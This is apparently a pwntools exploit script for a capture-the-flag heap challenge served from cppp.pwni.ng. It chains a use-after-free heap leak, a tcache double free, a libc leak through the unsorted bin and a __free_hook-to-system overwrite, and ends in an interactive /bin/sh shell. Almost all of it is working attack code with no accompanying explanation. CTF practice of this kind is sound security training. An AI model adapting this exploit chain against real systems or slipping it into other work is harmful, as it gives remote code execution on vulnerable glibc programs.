from pwn import *
from heaputils import *

def add(name, buf):
    r.recvuntil('Choice: ')
    r.sendline('1')
    r.recvuntil(': ')
    r.sendline(name)
    r.recvuntil(': ')
    r.sendline(buf)


def remove(idx):
    r.recvuntil('Choice: ')
    r.sendline('2')
    r.recvuntil('idx: ')
    r.sendline(str(idx))


def view(idx):
    r.recvuntil('Choice: ')
    r.sendline('3')
    r.recvuntil('idx: ')
    r.sendline(str(idx))
    return ''.join(r.recvuntil('Done!').split('\n')[:-1])

def debug():
    bp = [0x11E0]
    script = ""
    for x in bp:
        script += "b *0x%x\n"%(x+PIE)
    gdb.attach(r,gdbscript=script)

def print_arrayinfo():
    array = u64(r.leak(PIE+0x203260,8))
    log.info("array at: 0x%x"%(array))

if __name__ == "__main__":

    libc = ELF("./libc-2.27.so")
    r = remote("cppp.pwni.ng", 7777)


    add("X"*0x1080,"Z"*0x200)
    add("A"*0x90,"B"*0x90)
    add("C"*0x90,"D"*0x70+p64(0)+p64(0xa1)+p64(0)*2)

    remove(1)
    HEAP = u64(view(1).ljust(8,"\x00"))
    log.info("HEAP: 0x%x"%HEAP)

    # phase.2 double free to get arbitrary write, overwrite an existing text so that its name points to an unsorted bin
    remove(1)

    target = HEAP + 0x7f1bf796dd90 - 0x7f1bf796dc70
    unsorted_bin = HEAP + 0x7f727da98340 - 0x7f727da96c70

    payload = p64(0)*2+p64(0)+p64(0xa1)
    payload += p64(0x100)+p64(unsorted_bin)+p64(unsorted_bin)+p64(0x100)
    payload = payload.ljust(0x90,"\x00")

    add(payload,p64(target)*(0x90//8))
    # we can overwrite head with fakestruct to get arbitrary read primitive

    LIBC = u64(view(0).ljust(8,"\x00")) + 0x7fb5ebb08000 - 0x7fb5ebef42c0
    log.info("LIBC: 0x%x"%LIBC)

    add('a','b')
    add('c','d')

    remove(2)
    remove(2)

    target = LIBC + libc.symbols['__free_hook']
    system = LIBC + libc.symbols['system']


    add(p64(0),p64(target))
    add(p64(0xdeadcafe),p64(system)+p64(0xdeadbeef))

    context.log_level = 'debug'
    add("/bin/sh;\x00","/bin/sh;\x00")

    r.interactive()